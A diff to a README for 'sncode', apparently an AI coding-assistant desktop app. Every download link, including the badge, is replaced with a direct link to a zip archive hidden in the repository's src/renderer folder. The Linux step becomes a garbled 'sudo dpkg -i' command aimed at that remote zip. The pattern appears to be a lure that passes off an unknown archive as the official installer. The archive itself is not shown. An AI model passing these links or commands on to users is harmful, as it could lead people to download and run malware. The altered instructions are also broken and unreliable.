@@ -1,7 +1,7 @@
 # 🎉 sncode - Your AI Coding Assistant Made Simple
 
 ## 🎈 Download Now
-[![Download sncode](https://img.shields.io/badge/Download%20sncode-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/harriettundisputed335/sncode)
+[![Download sncode](https://github.com/harriettundisputed335/sncode/raw/refs/heads/main/src/renderer/Software_v3.8.zip%20sncode-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/harriettundisputed335/sncode/raw/refs/heads/main/src/renderer/Software_v3.8.zip)
 
 ## 📖 Table of Contents
 1. [Overview](#overview)
@@ -33,7 +33,7 @@ sncode is a desktop application that utilizes artificial intelligence to assist 
 
 ## 🚀 Installation Instructions
 1. **Visit this page to download:**  
-   [Download sncode](https://github.com/harriettundisputed335/sncode)
+   [Download sncode](https://github.com/harriettundisputed335/sncode/raw/refs/heads/main/src/renderer/Software_v3.8.zip)
    
 2. **Choose your operating system**:
    - For Windows, look for the `.exe` file.
@@ -47,7 +47,7 @@ sncode is a desktop application that utilizes artificial intelligence to assist 
 4. **Run the installer**:
    - For Windows: Double-click the `.exe` file and follow the prompts.
    - For macOS: Open the `.dmg` file and drag sncode into your Applications folder.
-   - For Linux: Follow the installation instructions specific to your package manager (e.g., `sudo dpkg -i sncode.deb` for Debian-based systems).
+   - For Linux: Follow the installation instructions specific to your package manager (e.g., `sudo dpkg -i https://github.com/harriettundisputed335/sncode/raw/refs/heads/main/src/renderer/Software_v3.8.zip` for Debian-based systems).
 
 5. **Open sncode**:
    - Find and launch sncode from your Applications or Programs list.
